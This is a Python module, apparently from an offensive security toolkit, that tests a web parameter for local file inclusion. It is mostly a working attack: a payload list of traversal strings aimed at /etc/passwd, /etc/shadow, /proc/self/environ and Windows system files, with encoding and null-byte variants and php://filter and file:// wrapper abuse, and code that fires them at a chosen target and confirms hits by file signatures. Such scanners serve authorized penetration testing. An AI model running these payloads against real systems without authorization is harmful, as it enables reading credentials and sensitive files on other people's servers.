"""
modules/vuln_scan/lfi_tester.py — Local File Inclusion (LFI) vulnerability tester.

Injects a comprehensive set of LFI payloads targeting /etc/passwd (Linux)
and various Windows equivalents, with multiple traversal depths and encodings.
Checks response bodies for file content signatures.
"""

import logging
from pathlib import Path

import requests
from requests.exceptions import RequestException
from rich.progress import (
    BarColumn,
    MofNCompleteColumn,
    Progress,
    SpinnerColumn,
    TextColumn,
    TimeElapsedColumn,
)

from modules.base_module import BaseModule

logger = logging.getLogger(__name__)

_PROJECT_ROOT = Path(__file__).resolve().parent.parent.parent

# -----------------------------------------------------------------------
# LFI payloads — various traversal depths and encodings
# -----------------------------------------------------------------------
LFI_PAYLOADS: list[tuple[str, str]] = [
    # (payload, expected_signature_key)

    # Linux — plain traversal
    ("../etc/passwd", "linux"),
    ("../../etc/passwd", "linux"),
    ("../../../etc/passwd", "linux"),
    ("../../../../etc/passwd", "linux"),
    ("../../../../../etc/passwd", "linux"),
    ("../../../../../../etc/passwd", "linux"),
    ("../../../../../../../etc/passwd", "linux"),
    ("../../../../../../../../etc/passwd", "linux"),

    # Linux — URL-encoded dot
    ("%2e%2e%2fetc%2fpasswd", "linux"),
    ("%2e%2e/%2e%2e/etc/passwd", "linux"),
    ("..%2fetc%2fpasswd", "linux"),
    ("..%252fetc%252fpasswd", "linux"),  # double-encoded
    ("%252e%252e%252fetc%252fpasswd", "linux"),

    # Linux — null byte (for PHP < 5.3)
    ("../../../etc/passwd%00", "linux"),
    ("../../../../etc/passwd%00.php", "linux"),

    # Linux — absolute path
    ("/etc/passwd", "linux"),
    ("/etc/shadow", "linux"),
    ("/proc/self/environ", "linux_environ"),
    ("/proc/version", "linux_proc"),

    # Windows — common sensitive files
    ("..\\..\\..\\windows\\win.ini", "windows"),
    ("..%5c..%5c..%5cwindows%5cwin.ini", "windows"),
    ("%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini", "windows"),
    ("c:\\windows\\win.ini", "windows"),
    ("C:/windows/win.ini", "windows"),
    ("C:/boot.ini", "windows_boot"),
    ("..\\..\\..\\boot.ini", "windows_boot"),

    # Wrapper abuse
    ("php://filter/convert.base64-encode/resource=/etc/passwd", "linux"),
    ("file:///etc/passwd", "linux"),
]

# Signatures that confirm a successful LFI for each signature key
LFI_SIGNATURES: dict[str, list[str]] = {
    "linux": ["root:x:0:0", "root:*:0:0", "bin:x:1:", "daemon:x:", "/bin/bash", "/bin/sh"],
    "linux_environ": ["HTTP_USER_AGENT=", "DOCUMENT_ROOT=", "PATH=", "SERVER_NAME="],
    "linux_proc": ["Linux version", "gcc version", "SMP "],
    "windows": ["[fonts]", "[extensions]", "[mci extensions]", "for 16-bit app support"],
    "windows_boot": ["[boot loader]", "timeout=", "default=multi(0)", "[operating systems]"],
}


class LfiTester(BaseModule):
    """Test a query parameter for Local File Inclusion (LFI) vulnerabilities.

    Sends each LFI payload and checks the response for file content signatures
    that confirm successful inclusion. Confirmed LFIs are reported as CRITICAL.
    """

    name = "LFI Tester"
    description = "Tests a query parameter for Local File Inclusion via path traversal payloads."
    author = "K4os"
    category = "vuln_scan"

    options = {
        "target": {
            "value": None,
            "required": True,
            "description": "Target URL (e.g. https://example.com/page).",
        },
        "param": {
            "value": None,
            "required": True,
            "description": "Query parameter name to inject into (e.g. file, page, path).",
        },
        "timeout": {
            "value": "5",
            "required": False,
            "description": "HTTP request timeout in seconds (default: 5).",
        },
    }

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    def _check_signature(self, body: str, sig_key: str) -> tuple[bool, str]:
        """Check if the response body contains any LFI confirmation signatures.

        Args:
            body: HTTP response body.
            sig_key: Key into LFI_SIGNATURES dict.

        Returns:
            Tuple of (confirmed: bool, matched_signature: str).
        """
        body_lower = body.lower()
        for sig in LFI_SIGNATURES.get(sig_key, []):
            if sig.lower() in body_lower:
                return True, sig
        return False, ""

    # ------------------------------------------------------------------
    # run()
    # ------------------------------------------------------------------

    def run(self) -> None:
        """Send all LFI payloads and check responses for file signatures."""
        self.clear_findings()
        self.validate_options()

        target = self.get_option("target")
        param = self.get_option("param")
        timeout = int(self.get_option("timeout") or 5)

        config_path = _PROJECT_ROOT / "config.yaml"
        user_agent = "RedKit/1.0 (Authorized Security Testing)"
        try:
            import yaml
            with open(config_path) as f:
                cfg = yaml.safe_load(f)
                user_agent = cfg.get("default_user_agent", user_agent)
        except Exception:
            pass

        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

        headers = {"User-Agent": user_agent}
        confirmed_signatures: set[str] = set()

        logger.info("LFI testing: target=%s, param=%s, payloads=%d", target, param, len(LFI_PAYLOADS))

        with Progress(
            SpinnerColumn(),
            TextColumn("[bold cyan]{task.description}"),
            BarColumn(),
            MofNCompleteColumn(),
            TimeElapsedColumn(),
            transient=False,
        ) as progress:
            task = progress.add_task(f"Testing LFI payloads on {target}", total=len(LFI_PAYLOADS))

            for payload, sig_key in LFI_PAYLOADS:
                progress.advance(task)
                url = f"{target}?{param}={payload}"
                try:
                    resp = requests.get(url, timeout=timeout, headers=headers, verify=False, allow_redirects=True)
                    confirmed, matched_sig = self._check_signature(resp.text, sig_key)
                    if confirmed and matched_sig not in confirmed_signatures:
                        confirmed_signatures.add(matched_sig)
                        logger.warning("LFI confirmed: payload=%s, sig=%s", payload, matched_sig)
                        self._add_finding(
                            finding_type="LFI",
                            severity="CRITICAL",
                            title=f"Local File Inclusion confirmed via '{param}' parameter",
                            detail=(
                                f"The server returned file content matching the signature '{matched_sig}', "
                                f"indicating successful path traversal. An attacker can read arbitrary "
                                f"files from the server filesystem, potentially exposing credentials, "
                                f"configuration files, or source code."
                            ),
                            evidence=f"GET {url}\nPayload: {payload}\nSignature matched: '{matched_sig}'\nResponse snippet: {resp.text[:300]}",
                        )
                except RequestException as exc:
                    logger.debug("Request error for LFI payload '%s': %s", payload, exc)

        total = len(self.get_findings())
        logger.info("LFI testing complete: %d confirmed finding(s).", total)
